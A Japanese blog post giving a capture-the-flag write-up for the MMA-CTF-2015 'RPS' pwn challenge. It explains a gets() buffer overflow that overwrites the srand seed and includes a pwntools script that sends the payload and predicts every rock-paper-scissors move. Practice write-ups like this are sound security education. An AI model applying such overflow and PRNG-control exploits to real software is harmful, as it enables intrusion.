---
layout: post
alias: "/blog/2016/09/02/mma-ctf-2015-rps/"
date: "2016-09-02T20:30:59+09:00"
tags: [ "ctf", "writeup", "pwn", "mmactf", "rand", "prng-prediction" ]
"target_url": [ "https://github.com/ctfs/write-ups-2015/tree/master/mma-ctf-2015/pwn/rps-50" ]
---

# MMA-CTF-2015: RPS

解けず。seedを操作できていることに気付いていなかった。`srand`が見えたときに乱数予測は思い受かんだのだが、`/dev/urandom`を見て消してしまった。

bofからのropができるので、それを考えてしまっていた。
`flag.txt`を読んで書き出す処理をする部分があるのでここに飛ばしたいが、`gets`によるbofでかつ位置が`0x400a9a`なので書き込めず飛ばせない。
gadgetがあまりないので厳しく、以下なら可能だと判断したが、明らかに$50$点問題のそれではなかったのでwriteupを見た。

-   stack pivotしながらlibc baseを特定し`mmap`からの再度stack pivotでshellを取る
-   `gets`と`printf`の`%n`指定子による書き込みで`flag.txt`の読み出しアドレスを作る

## solution

buffer overflowにより`srand`のseedを操作できる。出してくる手は固定なので全勝できる。

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
context.log_level = 'debug'

payload = ''
payload += 'A' * 0x30 # name
payload += p64(0) # seed
assert payload.find('\n') == -1

def play(s, cont=(lambda p: None)):
    p = process('./rps')
    p.recvuntil("What's your name: ")
    p.sendline(payload)
    for i, c in enumerate(s):
        p.recvuntil('Rock? Paper? Scissors? [RPS]')
        p.sendline(c)
        p.recvline()
        if p.recvline().strip() != 'You win!!':
            p.close()
            return i
    cont(p)
    p.close()
    return len(s)

s = ''
while len(s) < 50:
    for c in 'RPS':
        t = s + c * (50 - len(s))
        l = play(t)
        s = t[ : l]
play(s, lambda p: p.recvall())
```
